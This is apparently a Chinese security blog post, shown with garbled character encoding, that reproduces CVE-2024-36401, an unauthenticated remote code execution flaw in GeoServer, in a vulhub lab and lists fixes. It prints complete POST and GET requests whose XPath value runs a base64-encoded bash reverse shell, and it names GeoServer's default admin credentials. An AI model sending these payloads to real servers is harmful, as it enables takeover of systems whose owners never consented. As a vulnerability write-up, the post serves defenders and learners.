#  CVE-2024-36401ï¼šGeoServeræœªæˆæƒRCEæ¼æ´   
åŸåˆ› ä¸ƒå®‰  Timeline Sec   2024-08-02 18:04  
  
>   
> å…³æ³¨æˆ‘ä»¬â¤ï¸ï¼Œæ·»åŠ æ˜Ÿæ ‡ğŸŒŸï¼Œä¸€èµ·å­¦å®‰å…¨ï¼ä½œè€…ï¼šä¸ƒå®‰@Timeline Sec æœ¬æ–‡å­—æ•°ï¼š2704é˜…è¯»æ—¶é•¿ï¼š2ï½3min å£°æ˜ï¼šä»…ä¾›å­¦ä¹ å‚è€ƒä½¿ç”¨ï¼Œè¯·å‹¿ç”¨ä½œè¿æ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè´Ÿ  
  
## 0x01 ç®€ä»‹  
  
GeoServer æ˜¯ä¸€ä¸ªå¼€æºçš„åœ°ç†ä¿¡æ¯æœåŠ¡å™¨ï¼Œç”¨äºå‘å¸ƒå’Œå…±äº«åœ°ç†ç©ºé—´æ•°æ®ã€‚å®ƒæ˜¯ç”± GeoTools åº“é©±åŠ¨çš„ï¼ŒGeoTools æ˜¯ä¸€ä¸ªç”¨äºå¤„ç†åœ°ç†æ•°æ®çš„ Java åº“ã€‚GeoServer å…è®¸ç”¨æˆ·ä»å„ç§æ•°æ®æºï¼ˆå¦‚ Shapefileã€PostGISã€Oracle Spatialã€ArcSDE ç­‰ï¼‰å‘å¸ƒåœ°ç†ç©ºé—´æ•°æ®ï¼Œå¹¶é€šè¿‡æ ‡å‡†çš„ OGCï¼ˆOpen Geospatial Consortiumï¼‰åè®®ï¼ˆå¦‚ WMSã€WFSã€WCS ç­‰ï¼‰è¿›è¡Œè®¿é—®ã€‚  
## 0x02 æ¼æ´æ¦‚è¿°  
  
**æ¼æ´ç¼–å·ï¼šCVE-2024-36401**  
  
GeoServer è°ƒç”¨çš„ GeoTools åº“ API ä»¥ä¸€ç§ä¸å®‰å…¨åœ°å°†å®ƒä»¬ä¼ é€’ç»™ commons-jxpath åº“çš„æ–¹å¼è¯„ä¼°è¦ç´ ç±»å‹çš„å±æ€§/å±æ€§åç§°ï¼Œè¯¥åº“åœ¨è¯„ä¼° XPath è¡¨è¾¾å¼æ—¶å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œ  
å¯¼è‡´æœªæˆæƒçš„æ”»å‡»è€…èƒ½å¤Ÿå®ç°RCEã€‚  
## 0x03 å½±å“ç‰ˆæœ¬  
  
GeoServer <= Â 2.25.1ï¼Œ2.24.3ï¼Œ2.23.5  
## 0x04 ç¯å¢ƒæ­å»º  
  
ç¯å¢ƒæ­å»ºæ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ä½¿ç”¨ P ç‰›åœ¨ vulhub æä¾›çš„ç¯å¢ƒ, clone ä»“åº“åä½¿ç”¨å‘½ä»¤  
```
dockerÂ composeÂ upÂ -d

```  
  
å¯åŠ¨ç¯å¢ƒï¼Œç¯å¢ƒå¯åŠ¨åè®¿é—® http://ip:8080/geoserver  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsh5mQaYDdZIeekDZNazjZJicmVA7AWR8WhWKBmIEuvgBLT9JafFLGmajUMhtH3Ficx1XCsllVfSI8yA/640?wx_fmt=png&from=appmsg "")  
  
åœ¨è¿›è¡Œæ¼æ´å¤ç°æ—¶éœ€è¦æ³¨æ„ï¼štypeNameså¿…é¡»å­˜åœ¨ï¼Œå¯ä»¥åœ¨Webé¡µé¢/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage?3&filter=falseä¸­æ‰¾åˆ°å½“å‰æœåŠ¡å™¨ä¸­çš„æ‰€æœ‰Types  
  
å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsh5mQaYDdZIeekDZNazjZJicsiapuibJricw5R5VrHjzADzCV8QjBNWvaT0Pp1jickcoNvCVcx69iamGOKQ/640?wx_fmt=png&from=appmsg "")  
## 0x05 æ¼æ´å¤ç°  
  
é¦–å…ˆä½¿ç”¨ Python å¼€å¯ä¸€ä¸ª Web æœåŠ¡ï¼Œæ–¹ä¾¿éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨  
  
python3 -m http.server 8890  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgILic6iaIVialXCeeHjgDdQGhQtUH5xhw3AJTxgXib1yQP5hFLFoVDibwNF0dUTVx4abBv8ia4d1LGicZkQ/640?wx_fmt=png&from=appmsg "")  
  
  
æ„é€ è¯·æ±‚å¦‚ä¸‹ï¼š  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgILic6iaIVialXCeeHjgDdQGhRFB0HlGEt70ja6PhPQQE6jicv8iabSSLQGicXib3KFW0Ou47CF4icBgNNrg/640?wx_fmt=png&from=appmsg "")  
  
  
æŸ¥çœ‹ Web æœåŠ¡ä¸­æ˜¯å¦æ”¶åˆ°è¯·æ±‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgILic6iaIVialXCeeHjgDdQGhVC87dfglSgvYsXj80bdW0aiaibqIj95tTIqgDLPl0S9Hycc2eayh0h0Q/640?wx_fmt=png&from=appmsg "")  
  
  
æˆåŠŸæ”¶åˆ°è¯·æ±‚ï¼Œè¯æ˜æ¼æ´å­˜åœ¨  
  
**è¿›è¡ŒRCEï¼š**  
  
é¦–å…ˆåœ¨æ”»å‡»æœºä¸Šå¼€å¯ç›‘å¬ï¼š  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsh5mQaYDdZIeekDZNazjZJicSr8csrlfhJw3ZmQCttyByH1uoqVXbA79IlAnt278kjMk4BiaJEuPEMA/640?wx_fmt=png&from=appmsg "")  
  
æ„é€ æ¶æ„è¯·æ±‚ï¼Œ  
åå¼¹shellå‘½ä»¤  
  
éœ€è¦ç¼–ç ï¼š  
https://tools.zjun.info/runtime-exec-payloads/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsh5mQaYDdZIeekDZNazjZJicr5LgawqMsQSoZHbBuiaLN0yoouR3fN69GzukPERU5cJBKUDqlP2PbLQ/640?wx_fmt=png&from=appmsg "")  
  
æˆåŠŸæ”¶åˆ° shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsh5mQaYDdZIeekDZNazjZJicm5NuPesQOzaTEbKzZcWGZibGVsib5rHVAjzf3eCfq0WRqGqktbicJUThQ/640?wx_fmt=png&from=appmsg "")  
  
å®Œæ•´æ•°æ®åŒ…å¦‚ä¸‹ï¼š  
```
POSTÂ /geoserver/wfsÂ HTTP/1.1
Host:Â host:8080
Accept-Encoding:Â gzip,Â deflate,Â br
Accept:Â */*
Accept-Language:Â en-US;q=0.9,en;q=0.8
User-Agent:Â Mozilla/5.0Â (WindowsÂ NTÂ 10.0;Â Win64;Â x64)Â AppleWebKit/537.36Â (KHTML,Â likeÂ Gecko)Â Chrome/124.0.6367.118Â Safari/537.36
Connection:Â close
Cache-Control:Â max-age=0
Content-Type:Â application/xml
Content-Length:Â 379

<wfs:GetPropertyValueÂ service='WFS'Â version='2.0.0'
Â xmlns:topp='http://www.openplans.org/topp'
Â xmlns:fes='http://www.opengis.net/fes/2.0'
Â xmlns:wfs='http://www.opengis.net/wfs/2.0'>
Â Â <wfs:QueryÂ typeNames='sf:archsites'/>
Â Â <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bashÂ -cÂ {echo,base64(shell)}|{base64,-d}|{bash,-i}')</wfs:valueReference>
</wfs:GetPropertyValue>

```  
  
CVE-2024-36401 æ¼æ´çš„éªŒè¯æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä¸Šé¢çš„ POST æ–¹å¼ï¼Œä¸€ç§æ˜¯ GET æ–¹å¼ï¼ŒGET éªŒè¯æ–¹å¼çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼š  
```
GETÂ /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'bash%20-c%20%7Becho%2Curl(base64(shell))7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D')Â HTTP/1.1
Host:Â host:8080
Accept-Encoding:Â gzip,Â deflate,Â br
Accept:Â */*
Accept-Language:Â en-US;q=0.9,en;q=0.8
User-Agent:Â Mozilla/5.0Â (WindowsÂ NTÂ 10.0;Â Win64;Â x64)Â AppleWebKit/537.36Â (KHTML,Â likeÂ Gecko)Â Chrome/124.0.6367.118Â Safari/537.36
Connection:Â close
Cache-Control:Â max-age=0

```  
  
ç»“æœï¼š  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsh5mQaYDdZIeekDZNazjZJicuMSIw6X6W7ypgjkhCbRz1EK04yzibxahXahMQmy4ZbAH2JDgVFCAPRA/640?wx_fmt=png&from=appmsg "")  
## 0x06 ä¿®å¤æ–¹å¼  
  
1. åˆ é™¤ WEB-INF/lib/gt-complex-x.y.jarï¼Œä¾èµ– gt-complex-x.y.jar çš„åŠŸèƒ½ä¼šå—å½±å“  
  
2. æ›´æ–°åˆ°æ–°ç‰ˆæœ¬  
## å‚è€ƒé“¾æ¥  
  
https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401  
  
https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv  
## å†å²æ¼æ´  
  
é»˜è®¤è´¦å·å¯†ç admin/geoserverCVE-2024-36401CVE-2023-43795CVE-2023-25157CVE-2022-24816CVE-2021-40822  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
å›å¤  
ã€åŠ ç¾¤ã€‘  
è¿›å…¥å¾®ä¿¡äº¤æµç¾¤å›å¤  
ã€SRCç¾¤ã€‘è¿›å…¥SRC-QQäº¤æµç¾¤å›å¤  
ã€æ–°äººã€‘é¢†å–æ–°äººå­¦ä¹ æŒ‡å—èµ„æ–™å›å¤  
ã€é¢è¯•ã€‘è·å–æ¸—é€æµ‹è¯•å¸¸è§é¢è¯•é¢˜å›å¤  
ã€åˆä½œã€‘è·å–å„ç±»å®‰å…¨é¡¹ç›®åˆä½œæ–¹å¼å›å¤  
ã€å¸®ä¼šã€‘ä»˜è´¹åŠ å…¥SRCçŸ¥è¯†åº“å­¦ä¹ å›å¤  
ã€  
åŸ¹è®­ã€‘  
è·å–TimelineSecå®˜æ–¹åŸ¹è®­è¯¾ç¨‹è¯¦æƒ…  
  
  
è§†é¢‘å·ï¼šæœç´¢  
TimelineSec  
  
å®˜æ–¹å¾®åšï¼š[#å°ç¨‹åº://å¾®åš/tPbUYdN9EucSD4C]()  
  
  
å“”å“©å“”å“©ï¼š  
https://space.bilibili.com/52459  
â€1903  
  
  
  
â¤  
  
è§‰å¾—æœ‰ç”¨å°±ç‚¹ä¸ªèµå§ï¼  
  
æƒ³çœ‹ä»€ä¹ˆæ¬¢è¿è¯„è®ºåŒºç•™è¨€ï½  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
